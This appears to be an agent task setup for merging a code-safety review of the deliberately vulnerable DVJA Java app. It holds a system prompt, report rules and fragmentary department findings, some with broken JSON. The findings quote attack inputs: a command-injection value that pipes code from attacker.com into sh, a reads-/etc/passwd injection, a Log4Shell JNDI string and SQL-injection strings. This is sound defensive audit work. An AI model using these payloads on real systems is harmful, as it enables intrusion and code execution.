header.system:
You are an AI agent powered by DeepSeek Harness.

You are the integrating analyst of a code-safety review. Six departments have each committed `findings/<department>.json` and `report/<department>.md` on their own branch, and this worktree is the merge of all of them. You write two files and nothing else: `findings.json` and `SAFETY-REPORT.md`.

Read `REPORTING.md` in this worktree first: it states the finding format, the exact sections of the report, the count lines both summaries carry, and the certificate's wording. Read `target.json` for the tree under review and the SHA-256 the certificate states. Read every `findings/*.json` and every `report/*.md` before writing anything. When a `report-template` skill is available, load it: it owns how the report reads, while `REPORTING.md` owns what the examiner mechanically decides and wins wherever the two differ in form.

Ask the examiner which findings do not hold before you write the union:

    for f in findings/*.json; do node verify-safety-report.mjs --findings "$f" --list-invalid; done

Every id it prints is dropped from `findings.json` and named under `## What was not covered`, with the reason. Dropping one silently fails the report.

`findings.json` is the union, deduplicated by `file` plus `line` plus `cwe`, keeping the entry whose `confidence` is higher. Copy each entry whole; do not rewrite a department's `snippet`, because the examiner compares it with the target's own text.

The report is a review by a language model, grounded by a static scanner and by the committed examiner, over the files the departments actually read. `## Scope and method` says that, names the departments that ran and the tools that ran, and states what was read rather than what exists. `## What was not covered` is not a formality: name the file kinds nobody opened, the classes of defect no department owns, the checks that did not run, and every dropped finding. Never write that the target is secure, safe or free of vulnerabilities — nothing this program did could support it, and the examiner refuses the claim.

Before you stop, run `node verify-safety-report.mjs --report`, fix every line it names, and commit everything. Work left uncommitted is not delivered and is not measured. Never write into the target tree, and never edit `verify-safety-report.mjs`, `target.json` or any department's committed files.


Use the read tool — not shell commands like cat — to inspect text files. Results include line numbers. Use offset and limit to continue reading large files.

Use the write tool to create files or completely replace file contents. Existing files are overwritten, so read an existing file first (the default fs-observation-policy requires it) and prefer edit for targeted changes.

Use the edit tool for targeted changes to existing UTF-8 text files. It replaces literal old_string with new_string; by default old_string must appear exactly once. If old_string appears multiple times, provide a more specific old_string or set replace_all to true. Read the file first (the default fs-observation-policy requires it), unless you just created or edited it in this session.

Use the glob tool — not shell find — to discover files by path pattern. A pattern with no "/" matches basenames at any depth, so "*" matches every file in the tree rather than its top level. Results are files only, never directories, and include hidden and ignored files: a result that fits comes back in modification-time order, while a larger one is sampled across top-level entries, so it spans the tree instead of one subtree.

Use the grep tool — not shell grep or rg — to search file contents. Use read on a matched file when you need surrounding context.

Check the [exit code: N] marker on every bash result; investigate failures before moving on.

Track every background job id you start. You are notified in-session when a job finishes — do not busy-poll or sleep on one; keep working on independent steps and do not duplicate a running job's work. Before giving a final answer, collect every still-relevant job with job_output (set wait: true only when you are genuinely blocked on it), and job_kill jobs that stopped mattering.

tools.name: bash
tools.description: Execute a bash command (`bash -c`) and return its stdout/stderr. Each call runs in a fresh shell: no state (cwd, variables, functions) persists between calls — pass `workdir` instead of using `cd`. Non-zero exits are reported as `[exit code: N]`. Current harness environment facts are exposed through managed `$DSH_*` variables; inspect them when needed. Commands may run under a file sandbox; a blocked file operation is reported as `[sandbox: file access denied under <mode> mode]` — a policy denial, not a bug in the command; do not retry another way. Long output is truncated to its tail; the full output is saved to a file whose path is reported when available. Set `run_in_background: true` for long-running commands: the call returns a job id immediately; read its output with `job_output` and stop it with `job_kill`.

description.description: Clear, concise description of what this command does in active voice, 5-10 words (shown in the UI). Examples: "ls" → "List files in current directory"; "git status" → "Show working tree status"; "npm install" → "Install package dependencies".

timeoutMs.description: Timeout in milliseconds. The executor applies its configured default and cap, and kills the command on expiry.

workdir.description: Working directory for this command. Defaults to the session workspace; a relative path is resolved against it.

run_in_background.description: Run in the background and return a job id immediately (collect with job_output, stop with job_kill). No timeout applies.

tools.name: edit
tools.description: Edit an existing UTF-8 text file by replacing literal text.

file_path.description: Path to edit, resolved by the filesystem backend.

old_string.description: Literal text to replace. Must match exactly.

new_string.description: Literal replacement text. Use an empty string to delete the match.

replace_all.description: Replace all matches. Defaults to false; when false, old_string must appear exactly once.

tools.name: glob
tools.description: Find files whose paths match a glob pattern. Returns matching file paths — never directories — including hidden and ignored files (VCS metadata directories are excluded). Up to 100 paths come back in modification-time order; a larger result instead returns 100 paths sampled across top-level entries, says so, and reports where the complete sorted list was saved. This tool does not enumerate directory entries.

pattern.description: Glob pattern to match file paths against (e.g. "**/*.ts", "src/**/*.test.js"). A pattern with no "/" matches the basename at any depth, so "*" and "*.ts" both search the whole tree; include a separator to anchor the depth.

path.description: Directory to search in. Defaults to the session workspace; a relative path resolves against it.

tools.name: grep
tools.description: Search file contents with a ripgrep regular expression. Returns matching lines with line numbers, grouped by file. Returns the first 250 matches inline; a capped result reports where the complete match list was saved. Use read on a matched file for surrounding context.

pattern.description: Regular expression to search for (ripgrep syntax).

path.description: File or directory to search. Defaults to the session workspace; a relative path resolves against it.

include.description: One glob filter for which files to search (e.g. "*.ts", "*.{js,jsx}"). Not a list; negation is not supported.

tools.name: job_kill
tools.description: Request cancellation of a running background job by job id. Returns immediately; the job settles as killed once its work actually stops.

job_id.description: Job id returned by the tool that started the background work.

reason.description: Optional short reason, recorded in the log and forwarded to the job.

tools.name: job_list
tools.description: List your background jobs (running and finished) with their ids, kinds, and statuses.

tools.name: job_output
tools.description: Read a background job. Stream jobs return only output since the previous read; final-output jobs return their result after settlement. Every response ends with `[status: ...]`. Reads are non-blocking unless `wait: true`, which waits up to the configured cap.

job_id.description: Job id returned by the tool that started the background work.

wait.description: Block until the job reaches a terminal status or the timeout expires. A timed-out wait returns [status: running] and leaves the job alive.

timeout_ms.description: Max wait in milliseconds (only meaningful with wait: true). Defaults to the configured wait timeout; capped by the configured maximum.

tools.name: read
tools.description: Read a UTF-8 text file and return line-numbered content.

file_path.description: Path to read, resolved by the filesystem backend.

offset.description: 1-based first line to return. Defaults to 1.

limit.description: Maximum number of lines to return. Defaults to 2000.

tools.name: skill
tools.description: Load the full instructions for an available skill. Call this with the exact skill name from the session skill catalog before acting on a task that names or clearly matches that skill.

name.description: The exact skill name from the available skills list.

tools.description: Create or fully replace a UTF-8 text file.

<skill_instructions>
# The report layout

Every report has exactly these sections, in this order. Do not add marketing language, severity totals presented as a score out of ten, or a remediation timeline the review has no authority to commit the customer to.

- **`## Résumé exécutif`** — French. Counts per severity, the three most important findings by name and effect, what was and was not covered in one sentence each, and one paragraph on method.
- **`## Executive summary`** — the same content in English, for a mixed-language or non-French reader.
- **`## Scope and method`** — the repository, commit or tag reviewed, which directories or services were in scope, and a link to [review-method](../review-method/SKILL.md).
- **`## Findings`** — grouped by severity, critical first; one bullet per finding with its id, title, `file:line`, CWE, and confidence. Full detail (snippet, evidence, impact, fix) lives in the accompanying JSON per [severity-and-evidence](../severity-and-evidence/SKILL.md), not duplicated in prose here.
- **`## What was not covered`** — the [review-method](../review-method/SKILL.md) not-covered list, specific to this engagement.
- **`## Certificate`** — what a mechanical verifier checked after the fact: every finding resolves to a real file and line in the reviewed commit, every id is unique, every CWE/OWASP id is a known identifier, and no two findings share file, line, and CWE. This certifies the report's internal consistency, not the completeness or correctness of the review's judgment.

## Filled example: a small Express app

```markdown
## Résumé exécutif

Cette revue a porté sur le code source de commande-api, une application Express.js
de gestion de commandes, au commit a1b2c3d. Elle a permis d'identifier 3 constats :
1 critique, 1 moyen et 1 faible. Les plus importants : (1) une injection SQL
critique dans la recherche de commande par identifiant (src/routes/orders.js:42),
permettant de lire ou modifier toute donnée accessible par l'utilisateur de base de
données de l'application ; (2) une fixation de session lors de la connexion
(src/routes/auth.js:58) ; (3) l'absence de l'en-tête HSTS (src/app.js:12). La revue
a couvert les points d'entrée HTTP, l'authentification et la gestion des sessions ;
elle n'a pas couvert l'infrastructure de déploiement ni les dépendances tierces
(voir « Ce qui n'a pas été couvert »). Méthode : lecture des points d'entrée,
suivi des données de la source jusqu'au point d'exécution, un constat par point
d'exécution, ligne exactement citée et niveau de confiance déclaré pour chacun.

## Executive summary

This review covered commande-api, an Express.js order-management application, at
commit a1b2c3d, and found 3 issues: 1 critical, 1 medium, 1 low. The most
important: (1) a critical SQL injection in order lookup by id
(src/routes/orders.js:42); (2) session fixation on login
(src/routes/auth.js:58); (3) a missing HSTS header (src/app.js:12). HTTP entry
points, authentication, and session handling were covered; deployment
infrastructure and third-party dependencies were not (see "What was not covered").

## Scope and method

Repository commande-api, commit a1b2c3d, `src/` only. Method: [review-method](../review-method/SKILL.md).

## Findings

### Critical
- SEC-001 — SQL injection in order lookup — `src/routes/orders.js:42` — CWE-89 — confirmed

### Medium
- SEC-002 — Session id not rotated after login (session fixation) — `src/routes/auth.js:58` — CWE-384 — likely

### Low
- SEC-003 — Missing Strict-Transport-Security header — `src/app.js:12` — CWE-319 — confirmed

## What was not covered

- `infra/` (Terraform, Dockerfiles) and CI/CD configuration.
- Third-party dependency advisories (separate engagement).
- Runtime configuration: actual deployed environment variables, WAF rules, and network topology.
- Native mobile or memory-safety classes of bug: this codebase has no native module.

## Certificate

Mechanically verified: 3/3 findings resolve to an existing line at commit a1b2c3d;
3/3 ids unique; 3/3 CWE and OWASP ids recognized; 0 findings share file, line, and
CWE. This certifies internal consistency only, not completeness of coverage.
```
</skill_instructions>
</skill_content>

1: # How this program reports what it found
2: 
3: This worktree is the **report repository**. The code under review is the **target tree**, which is somewhere else on this host: `target.json` beside this file states its absolute path, the files it covers, and the SHA-256 the whole tree locks to.
4: 
5: The target is read-only for every session of this program. `verify-safety-report.mjs` re-hashes every locked file on every run, so a target a department edited fails the program instead of releasing a report about a tree that no longer exists.
6: 
7: ## This file and the skills
8: 
9: When the deployment mounts the code-safety knowledge pack, its `review-method`, `severity-and-evidence` and `report-template` skills own the craft: how to read a codebase, how to score a severity, what evidence has to name, and how the report reads. Follow them.
10: 
11: This file owns what `verify-safety-report.mjs` mechanically decides, and it is binding wherever the two differ in form. There is one such place and it is stated below: the counts each summary carries are written as `- <severity>: <count>` lines so the examiner can compare them with the union, which is the machine-readable form of the skill's "counts per severity".
12: 
13: ## What a department delivers
14: 
15: Two files, both committed on the department's own branch:
16: 
17: - `findings/<department>.json` — a JSON array of findings, `[]` when the department found nothing.
18: - `report/<department>.md` — the department's own prose: what it looked at, what it found, and what it did not reach.
19: 
20: Nothing else. Do not write `SAFETY-REPORT.md`, `findings.json`, `target.json` or `verify-safety-report.mjs`: the first two are the integration's, and the last two are the examiner.
21: 
22: ## The evidence rule
23: 
24: A finding without a file and a line is not a finding. Quote the exact line you cite; `verify-safety-report.mjs` compares your `snippet` with the target's own text at that line, ignoring only whitespace, and refuses the whole file when they differ.
25: 
26: Prefer three findings you have read the code for over twelve a pattern matched. `confidence` is what you actually know: `confirmed` when you read the sink, the source and the path between them; `likely` when the sink is dangerous and the source is plausibly attacker-controlled; `possible` when the pattern is there and the reachability is not established.
27: 
28: ## The finding
29: 
30: ```json
31: {
32:   "id": "secrets-cookie-secret",
33:   "cwe": "CWE-798",
34:   "owasp": "A07:2021 Identification and Authentication Failures",
35:   "severity": "high",
36:   "confidence": "confirmed",
37:   "title": "Session cookie secret is hard-coded in the committed configuration",
38:   "file": "config/env/all.js",
39:   "line": 8,
40:   "snippet": "cookieSecret: \"session_cookie_secret_key_here\",",
41:   "evidence": "The value is a literal in a committed file and is the secret express-session is configured with.",
42:   "impact": "Anyone with the repository can forge a session cookie and authenticate as any user.",
43:   "fix": "Read the secret from the environment and rotate the committed value.",
44:   "references": ["https://cwe.mitre.org/data/definitions/798.html"]
45: }
46: ```
47: 
48: | Field | Rule |
49: | --- | --- |
50: | `id` | letters, digits, dots, dashes or underscores, unique across the whole program; prefix it with your department or use the pack's `SEC-<n>` numbering. |
51: | `cwe` | `CWE-<number>`. |
52: | `owasp` | the OWASP Top 10 category, named. |
53: | `severity` | `critical`, `high`, `medium`, `low` or `info`. |
54: | `confidence` | `confirmed`, `likely` or `possible`. |
55: | `title` | one line a reader can act on. |
56: | `file` | path relative to the target root, exactly as `target.json` lists it. |
57: | `line` | 1-based line in that file. |
58: | `endLine` | optional last line when the finding spans several; `snippet` then quotes all of them. |
59: | `snippet` | the target's own text at those lines, verbatim. |
60: | `evidence` | why this line is the vulnerability, naming what you read. |
61: | `impact` | what an attacker gets. |
62: | `fix` | what to change. |
63: | `references` | array of URLs or identifiers; may be empty. |
64: 
65: ## Checking your own work before you commit
66: 
67: ```sh
68: node verify-safety-report.mjs --findings findings/<department>.json
69: ```
70: 
71: That is the same command your goal is measured by. Run it, fix what it names, then commit everything — work left uncommitted is not delivered and is not measured.
72: 
73: ## What the integration delivers
74: 
75: The integration merges every department branch and then writes two files of its own.
76: 
77: `findings.json` is the union of every `findings/<department>.json`, deduplicated by `file` + `line` + `cwe`, keeping the entry with the higher `confidence`. Before writing it, ask the examiner which findings do not hold:
78: 
79: ```sh
80: for f in findings/*.json; do node verify-safety-report.mjs --findings "$f" --list-invalid; done
81: ```
82: 
83: Every id that command prints is dropped from `findings.json` and named under `## What was not covered`, with the reason the examiner gave. Dropping one silently fails the report: `--report` refuses a union that omits an id no section discloses.
84: 
85: `SAFETY-REPORT.md` carries exactly these sections, in this order:
86: 
87: ```markdown
88: ## Résumé exécutif
89: 
90: <deux paragraphes en français : ce qui a été examiné, ce qui a été trouvé, ce que cela implique>
91: 
92: - critical: 0
93: - high: 0
94: - medium: 0
95: - low: 0
96: - info: 0
97: 
98: ## Executive summary
99: 
100: <the same in English>
101: 
102: - critical: 0
103: - high: 0
104: - medium: 0
105: - low: 0
106: - info: 0
107: 
108: ## Scope and method
109: 
110: <the target, its locked file count, which departments ran, which tools ran — the scanner, the advisory source — and which files were actually read>
111: 
112: ## Findings
113: 
114: ### critical
115: 
116: - `<id>` — <title> (`<file>:<line>`, <cwe>, <confidence>) — <impact, then fix>
117: 
118: ### high
119: 
120: ...
121: 
122: ## What was not covered
123: 
124: - <a department, a file kind, a class of vulnerability, or a check that did not run, and why>
125: - <every dropped finding id, with the examiner's reason>
126: 
127: ## Certificate
128: 
129: Verified findings: <count>
130: Target tree: <the sha256 from target.json>
131: 
132: <one sentence on what was checked mechanically: that every finding resolves to a real file and line in the locked tree, that every id is unique, and that no two findings share file, line and CWE>
133: 
134: This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".
135: ```
136: 
137: Both summary sections state a `- <severity>: <count>` line for all five severities, and the five counts must be the counts `findings.json` actually holds. Every finding id in `findings.json` is cited in `## Findings`. Every `<file>:<line>` written anywhere in the report must resolve in the target, so write a path you did not read as prose rather than as a citation.
138: 
139: The report is a review by a language model, grounded by a static scanner and by this examiner. Say so in `## Scope and method`. Never write that the target is secure, safe, or free of vulnerabilities: `verify-safety-report.mjs` refuses those claims, because nothing this program did could support one.
140: 
141: Check it before you commit:
142: 
143: ```sh
144: node verify-safety-report.mjs --report
145: ```

(End of file - total 145 lines)

lines.text: "title": "Apache Struts2 2.3.30 (struts2-core, struts2-config-browser-plugin, struts2-spring-plugin) carries multiple pre-authentication remote code execution advisories",

"evidence": "pom.xml line 12 sets the `struts2.version` property to `2.3.30`, which is reused by struts2-core (lines 21-24), struts2-config-browser-plugin (lines 26-30) and struts2-spring-plugin (lines 91-95). web.xml (src/main/webapp/WEB-INF/web.xml, lines 13-16 and 23-26) registers `org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter` under the `struts2` filter name and maps it to `/*`, so every HTTP request to this application is parsed by Struts2's own dispatcher and, for multipart requests, by its bundled Jakarta Commons FileUpload-based multipart parser before any application controller code runs. Querying OSV (api.osv.dev, ecosystem Maven) for `org.apache.struts:struts2-core@2.3.30` returned 17 distinct advisories whose ranges include 2.3.30, among them: GHSA-j77q-2qqg-6989 / CVE-2017-5638 (Jakarta Multipart parser OGNL injection via the Content-Type header, fixed 2.3.32 — the Equifax-breach vulnerability), GHSA-cr6j-3jp9-rw65 / CVE-2018-11776 (namespace/action OGNL RCE, fixed 2.3.35), GHSA-v8j6-6c2r-r27c / CVE-2021-31805 (forced OGNL re-evaluation RCE, fixed 2.5.30), GHSA-wp4h-pvgw-5727 / CVE-2019-0230 (forced OGNL evaluation RCE, fixed 2.5.22), GHSA-jc35-q369-45pv / CVE-2020-17530 (forced double OGNL evaluation RCE, fixed 2.5.26), and GHSA-8mr5-h28g-36qx / CVE-2017-9787 (Spring AOP-related DoS, fixed 2.3.33). None of these require application code changes to trigger: the vulnerable parsing/evaluation logic is entirely inside struts2-core itself, reached the moment a crafted HTTP request hits the globally-mapped filter.",

"impact": "An unauthenticated remote attacker can execute arbitrary code on the server with the privileges of the servlet container by sending a single crafted HTTP request (e.g. a malicious Content-Type header for CVE-2017-5638, or a crafted URL/namespace for CVE-2018-11776), leading to full host compromise.",

"fix": "Upgrade the `struts2.version` property in pom.xml to a currently supported Struts 6.x release (or, at minimum, 2.5.33 to close the advisories with a 2.5.x fix) and retest all actions; several of these advisories require the 2.5.x or 6.x line and are not fixable by a Struts 2.3.x point release alone.",
"title": "log4j-core 2.3 is vulnerable to Log4Shell (CVE-2021-44228) and is wired in as the framework's active logger",

"evidence": "pom.xml line 13 sets `log4j2.version` to `2.3`, used by log4j-core (lines 45-49) and log4j-api (lines 39-43). Querying OSV for `org.apache.logging.log4j:log4j-core@2.3` confirms the version falls inside the vulnerable range for GHSA-jfh8-c2jp-5v3q / CVE-2021-44228 (Log4Shell, introduced 2.0-beta9, fixed 2.3.1) and also GHSA-fxph-q3j8-mv87 / CVE-2017-5645 (SocketServer deserialization RCE, fixed 2.8.2), GHSA-7rjr-3q55-vv33 / CVE-2021-45046 and GHSA-p6xc-xr62-6r2g / CVE-2021-45105. That this version is actually loaded, not just declared: pom.xml's jetty-maven-plugin configuration (lines 165-169) sets the system property `xwork.loggerFactory=com.opensymphony.xwork2.util.logging.log4j2.Log4j2LoggerFactory`, forcing Struts2's XWork core to log through Log4j2, and src/main/resources/log4j2.xml (lines 9-11) configures Loggers for `com.opensymphony.xwork2`, `org.apache.struts2` and `com.appsecco` at info/debug level, i.e. Log4j2 is the framework's live logging backend. Separately, src/main/java/com/appsecco/dvja/services/UserService.java line 104 (logger.info(\"Failed to find user with login: \" + login);) and line 93 log the attacker-supplied `login` request parameter by string concatenation, the textbook Log4Shell injection pattern — though that particular `Logger` is imported as `org.apache.log4j.Logger` (line 5), the legacy Log4j 1.x API, and pom.xml also declares `org.slf4j:slf4j-log4j12` (a binding that transitively pulls real Log4j 1.x), so I could not confirm from the 174 files in scope whether this specific call is served by log4j-core 2.3 or by the transitively-pulled Log4j 1.x jar. I mark this `likely` rather than `confirmed` because I did not trace a concrete attacker string into a Log4j2-backed log statement inside Struts2/XWork's own (out-of-scope, compiled) source; the framework-level wiring and the version match are read and confirmed.",

"impact": "If any Log4j2-backed log statement in the running application (application code or the Struts2/XWork framework logging this project explicitly enables) ever includes attacker-controlled text, an unauthenticated attacker can achieve remote code execution via a `${jndi:ldap://...}` payload, without any further precondition.",

"fix": "Upgrade the `log4j2.version` property in pom.xml to 2.17.1 or later, and separately remove or replace `org.slf4j:slf4j-log4j12` so the classpath does not silently carry an additional, unrelated Log4j 1.x implementation.",
"title": "slf4j-log4j12 1.5.2 is a 2008-era, long-unmaintained binding that transitively pulls the end-of-life Log4j 1.x line",

"evidence": "pom.xml lines 51-55 declare `org.slf4j:slf4j-log4j12:1.5.2`, an SLF4J-to-Log4j-1.x binding released in 2008 whose parent SLF4J project stopped issuing 1.5.x releases well over a decade ago. "impact": "Carrying an end-of-life logging implementation on the classpath means any future disclosure against Log4j 1.x's default or commonly-enabled appenders will never receive an upstream fix, and it duplicates/confuses the logging stack alongside the also-declared Log4j 2.3.",
"fix": "Remove `slf4j-log4j12` and route all logging through the already-declared Log4j 2 (`log4j-api`/`log4j-core`), e.g. via `log4j-slf4j-impl`, after upgrading log4j-core past 2.17.1.",

lines.text: "title": "SQL injection in user login search via string-concatenated JPQL",
"snippet": "Query query = entityManager.createQuery(\"SELECT u FROM User u WHERE u.login = '\" + login + \"'\");",

"evidence": "The `userSearch` action in struts.xml (line 56) maps to UserAction.search() (src/main/java/com/appsecco/dvja/controllers/UserAction.java:104-121). That method reads the `login` property, which Struts' params interceptor populates directly from the request's `login` form field (setLogin at UserAction.java:37-39, bound to the `<s:textfield name=\"login\">` in UserSearch.jsp:22), with only an isEmpty check, no escaping. It is passed unmodified to userService.findByLoginUnsafe(getLogin()) at UserAction.java:109, which builds the JPQL string by concatenation at UserService.java:75 with no parameter binding. The only guard on the route is the authenticationStack interceptor, which requires any logged-in session (AuthenticationInterceptor.java:18) and performs no further validation or escaping of the login value.",

"impact": "Any authenticated user (registration is self-service and unrestricted) can inject JPQL/SQL through the login field, e.g. `' OR '1'='1` to dump arbitrary user rows, or UNION-based payloads to read other tables reachable by the JPA persistence unit, bypassing per-user data isolation entirely.",

"fix": "Use a parameterized query as UserService.findByLogin already does two methods above: entityManager.createQuery(\"SELECT u FROM User u WHERE u.login = :login\").setParameter(\"login\", login); remove findByLoginUnsafe or route UserAction.search() through the safe findByLogin method instead.",
"title": "SQL injection in product listing search via string-concatenated JPQL LIKE clause",
"snippet": "Query query = entityManager.createQuery(\"SELECT p FROM Product p WHERE p.name LIKE '%\" + name + \"%'\");",

"evidence": "The `listProduct` action in struts.xml (line 74) maps to ProductAction.list() (src/main/java/com/appsecco/dvja/controllers/ProductAction.java:62-69). searchQuery is set from the request via the params interceptor (setSearchQuery, ProductAction.java:22-24), bound to the `<s:textfield name=\"searchQuery\">` form in ProductList.jsp:63. When non-empty, list() calls productService.findContainingName(searchQuery) at ProductAction.java:66, which concatenates the raw string directly into a JPQL LIKE clause at ProductService.java:48 with no parameter binding or escaping. The route only requires the authenticationStack session check (AuthenticationInterceptor.java:18), no input validation.",

"impact": "Any authenticated user can break out of the LIKE clause (e.g. `%' OR '1'='1` or UNION-based payloads) to enumerate or exfiltrate arbitrary rows from any table the persistence unit's database user can reach.",
"fix": "Bind the value as a parameter instead of concatenating it: entityManager.createQuery(\"SELECT p FROM Product p WHERE p.name LIKE :name\").setParameter(\"name\", \"%\" + name + \"%\").",
"title": "OS command injection in the ping diagnostic feature",

"evidence": "The `ping` action in struts.xml (line 68) maps to PingAction.execute(), guarded only by the authenticationStack session check. execute() (PingAction.java:30-41) requires only that `address` is non-empty, then calls doExecCommand(). `address` is set from the request by the params interceptor via setAddress (PingAction.java:18-20), bound to the `<s:textfield name=\"address\">` field in Ping.jsp. doExecCommand() concatenates that value unsanitized into a shell command string handed to `/bin/bash -c` at line 45, then Runtime.exec(command) at line 46 executes it.",

"impact": "Any authenticated user can supply an address such as `127.0.0.1; cat /etc/passwd` or `$(curl attacker.com/x|sh)` to run arbitrary shell commands as the application's OS user, since the value reaches `/bin/bash -c` verbatim.",

"fix": "Do not build a shell command string from user input. Validate `address` as a strict IP/hostname (allowlist regex) before use, and prefer ProcessBuilder with an argument array and no shell (e.g. {\"ping\",\"-c\",\"5\",address}) after validation, rather than concatenating into a `bash -c` string.",
"title": "Reflected XSS in product search results via raw scriptlet output",

"evidence": "The `listProduct` action (struts.xml:74) forwards to this JSP after ProductAction.list() runs with the `searchQuery` request parameter (ProductAction.java:62-69). This line reads the same parameter directly from the raw HttpServletRequest with `request.getParameter(\"searchQuery\")` and writes it into the HTML with a `<%= %>` scriptlet, bypassing Struts' auto-escaping `<s:property>` tag used everywhere else on the page (e.g. line 42) and performing no HTML-encoding at all.",

"impact": "An attacker can craft a link to `listProduct?searchQuery=<script>...</script>` and send it to any authenticated victim; visiting it executes attacker-controlled JavaScript in the victim's session, allowing session/cookie theft or actions performed as the victim.",

"fix": "Replace the scriptlet with the escaping tag already used elsewhere on this page, e.g. `<s:property value=\"searchQuery\"/>` (default `escape=true`), or explicitly HTML-encode the parameter before output.",
"title": "Stored XSS in product name rendered with escaping disabled",

"evidence": "The `addEditProduct` action (struts.xml:79) maps to ProductAction, whose `product` field is populated by Struts' params interceptor from the `product.name` form field in ProductEdit.jsp:30 (auto-vivified via getProduct()/setName()). ProductAction.execute() (ProductAction.java:71-93) calls productService.save(product) with no sanitization, persisting the raw name (ProductService.java:27-34). Every visitor to `listProduct` then has that stored value rendered here with `escape=\"false\"`, which explicitly disables Struts' default HTML-escaping for the `<s:property>` tag.",

"impact": "Any authenticated user who can add/edit a product (no extra role check is present) can store an HTML/JS payload in the product name; it then executes in the browser of every other user who views the product list, enabling session theft or privilege escalation across the user base.",

"fix": "Remove `escape=\"false\"` so the tag's default HTML-escaping applies (`<s:property value=\"name\"/>`), or if raw HTML is genuinely required, sanitize the stored value through an allowlist HTML sanitizer immediately before this render.",
"title": "Unvalidated open redirect via the `url` request parameter",

"evidence": "The `redirect` action (struts.xml:100-102) has no interceptor-ref, so it is reachable unauthenticated. It maps to RedirectAction (src/main/java/com/appsecco/dvja/controllers/RedirectAction.java), whose `url` field is set directly from the request's `url` parameter via setUrl (RedirectAction.java:13-15) with no allowlist or same-origin check. execute() (RedirectAction.java:17-22) returns \"redirect\" whenever `url` is non-empty, and this result config evaluates `${url}` as the OGNL-interpolated Location for an HTTP redirect, sending the browser to whatever URL the attacker supplied.",

"impact": "An attacker can send a victim a link such as `/redirect?url=https://evil.example/phish` on the trusted domain; the victim's browser is redirected to an attacker-controlled site, useful for phishing and for bypassing URL allowlists in other controls.",

"fix": "Validate `url` against an allowlist of internal paths or known-good hosts before returning the redirect result, or resolve it and reject any value whose host does not match the application's own host.",

12:     "evidence": "struts.xml sets struts.devMode to true globally for the whole application (there is no per-environment override anywhere else in the tree, and scripts/start.sh runs the app with `mvn jetty:run`, i.e. this exact config file, in the container that docker-compose.yml exposes on port 8080). lines.text: "title": "Struts2 developer mode (devMode) is enabled, exposing debug diagnostics and the OGNL debugging console",

"evidence": "struts.xml sets struts.devMode to true globally for the whole application (there is no per-environment override anywhere else in the tree, and scripts/start.sh runs the app with `mvn jetty:run`, i.e. this exact config file, in the container that docker-compose.yml exposes on port 8080). With devMode on, Struts2's default interceptor stack (inherited here by every action through `extends=\"struts-default\"` at struts.xml:12 and by authenticationStack's `interceptor-ref name=\"defaultStack\"` at struts.xml:20) renders a full exception report with stack traces and internal parameter/value-stack details on any action error, and historically exposes the `?debug=command`/`?debug=browser` OGNL console endpoints that the framework's bundled debugging interceptor provides when devMode is on. I read the config line and the package inheritance chain that puts every action under this mode; I did not open the vendored struts-default.xml inside the struts2-core jar to directly confirm the debugging interceptor is still bound in this exact stack, so the console/RCE portion of the impact is inferred from well-documented Struts2 devMode behavior rather than fully traced.",

"impact": "Any remote, unauthenticated request that triggers an action exception returns internal stack traces, class names and OGNL value-stack contents; if the debugging interceptor is present as by default, an attacker can additionally reach an interactive OGNL console capable of arbitrary server-side code execution, without any credentials.",

"fix": "Set struts.devMode to false in the shipped struts.xml (or override it via struts.properties/system property per environment) before any deployment that is reachable outside a developer's own machine.",
"title": "Struts2 config-browser debug plugin is shipped in the production build",

"evidence": "This dependency has no <scope>test</scope> (contrast with struts2-junit-plugin at pom.xml:32-37, which is explicitly scoped to test), so it is packaged into the deployed WAR. I read the dependency declaration and its missing scope; I did not open the plugin jar's own struts-plugin.xml to confirm the exact URL it registers, so the plugin's own routing is inferred from its documented behavior rather than read directly.",

"impact": "An unauthenticated visitor can enumerate the application's full action/interceptor/validator configuration, materially aiding further attacks (e.g. against the devMode OGNL console in platform-001).",
"fix": "Remove struts2-config-browser-plugin from the production dependency set, or mark it test/provided scope and ensure it is excluded from the packaged WAR.",
"title": "No security-headers filter is mounted: CSP, X-Frame-Options, X-Content-Type-Options and HSTS are all absent",

"evidence": "web.xml declares exactly two filters (Spring's OpenEntityManagerInViewFilter and this struts2 filter) and no others; this is the last filter registered before the filter-mapping block that wires both filters to `/*`. I grepped the whole target tree for Access-Control, X-Frame-Options, Content-Security-Policy, Strict-Transport, X-Content-Type, addHeader and setHeader and the only hit is BaseController.java:72, which sets `Content-Type: application/json` and nothing else. "impact": "Responses can be framed by any origin (clickjacking), browsers may MIME-sniff response bodies leading to stored-content XSS in some browsers, and there is no HSTS to prevent protocol downgrade to plain HTTP.",

"fix": "Add a servlet Filter (or upgrade the Struts2/Spring stack to a version with a built-in security-headers facility) that sets X-Frame-Options: DENY (or frame-ancestors in a CSP), X-Content-Type-Options: nosniff, a restrictive Content-Security-Policy, and Strict-Transport-Security, and mount it ahead of the struts2 filter in web.xml.",
"title": "Session cookie has no explicit Secure, HttpOnly or SameSite configuration, and keeps the container's default name",

"evidence": "I read the whole web.xml (36 lines, reproduced above and around this excerpt) and it contains no <session-config> element and therefore no <cookie-config> child to set secure, http-only or a custom session-cookie name; this listener block is the last piece of configuration before the closing </web-app> tag, i.e. where a <session-config> would have to be added. The app is built and run with `mvn jetty:run` (pom.xml:160-161, scripts/start.sh:9), so the session cookie's Secure/SameSite behaviour falls back to the bundled Jetty 9.3.0.M2's own defaults rather than an explicit application setting; I did not trace into Jetty's own source to confirm those defaults, so this link is inferred rather than read.",

"impact": "Without an explicit Secure flag the session cookie (JSESSIONID by default) can be sent over plain HTTP if the app is ever reached that way, and without SameSite it is more exposed to cross-site request delivery; the default cookie name also makes the app easy to fingerprint.",

"fix": "Add a <session-config><cookie-config><secure>true</secure><http-only>true</http-only></cookie-config></session-config> block to web.xml, set a non-default session cookie name, and configure SameSite (via the servlet container or a response filter) once the deployment target's servlet version supports it.",
"title": "Raw exception message from a database query is returned to the client on the user-search form",

1: # Access department report — authentication, session handling and authorization
2: 
3: Target: `/home/user/targets/dvja` (Damn Vulnerable Java Application — Struts2 + Spring + JPA), 174 files locked in `target.json`, sha256 `014b5713f91d7c23181b282f75b1e8220f54f5d5de5e0ea36f28e1c456a80982`. Method: [review-method](../REPORTING.md) — entry points first, then data traced from input to sink, one finding per sink, exact line quoted, confidence stated per finding.
4: 
5: ## Route table
6: 
